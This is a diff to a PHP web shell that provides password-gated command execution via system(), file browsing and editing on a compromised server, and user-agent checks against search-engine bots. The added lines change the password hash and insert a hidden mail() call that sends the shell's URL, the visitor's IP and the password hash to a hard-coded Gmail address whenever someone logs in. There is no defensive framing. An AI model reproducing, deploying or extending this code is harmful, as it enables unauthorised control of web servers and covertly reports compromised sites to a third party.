@@ -27,7 +27,7 @@ session_start();
 //ini_set('log_errors',0);
 //ini_set('display_errors',0);
 //ini_set('max_execution_time',0);
-$auth_pass = "40c880e51dca8d68fddadff873dca125"; // 7c
+$auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; //  sha1('tuzki')
 if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 	$userAgents = array(
 		"Googlebot",
@@ -73,11 +73,16 @@ function login_shell() {
 <?php
 	exit;
 }
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
-	if (empty($auth_pass) or (isset($_GET['pass']) and md5(sha1($_GET['pass'])) == $auth_pass)) {
-		$_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
-	}
-	else {
+if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))])) {
+	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
+		$_SESSION[md5(sha1($_SERVER['HTTP_HOST']))] = true;
+		$email        = "gedzsarjuncomuniti@gmail.com"; // Your Email
+		$shell_path   = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+		$subject      = "Logs";
+		$from         = "From:Cvar1984";
+		$content_mail = "URL : $shell_path\n\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n\nPassword : $auth_pass\n\nBy Cvar1984";
+		@mail($email, $subject, $content_mail, $from);
+	} else {
 		login_shell();
 	}
 }
@@ -203,7 +208,7 @@ function info() {
 	die();
 }
 function logout() {
-	unset($_SESSION[md5($_SERVER['HTTP_HOST']) ]);
+	unset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))]);
 	home();
 }
 function alert($message) {
@@ -227,6 +232,10 @@ function edit($filename) {
 </form>
 <?php
 	die();
+}
+function open($filename) {
+	alert("this extension is not supported");
+	home();
 }
 function cmd($cmd) {
 	if (function_exists('system')) {
@@ -300,6 +309,9 @@ elseif ($_GET['do'] == 'open' and isset($_GET['dir'])) {
 	$dir = $_GET['dir'];
 	chdir($dir);
 }
+elseif ($_GET['do'] == 'view' and isset($_GET['files'])) {
+	open($_GET['files']);
+}
 $dir = scandir(getcwd());
 foreach ($dir as $dir):
 ?>
@@ -312,8 +324,12 @@ foreach ($dir as $dir):
 	else {
 		$sep = '/';
 	}
+	$ext = pathinfo($dir, PATHINFO_EXTENSION);
 	if (is_dir($dir)) {
 		echo "<td><a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+	}
+	elseif ($ext == 'jpg' OR $ext == 'png' OR $ext == 'jpeg' OR $ext == 'gif' OR $ext == 'rar' OR $ext == 'zip' OR $ext == 'doc' OR $ext == 'pdf') {
+		echo "<td><a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 	}
 	else {
 		echo "<td><a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
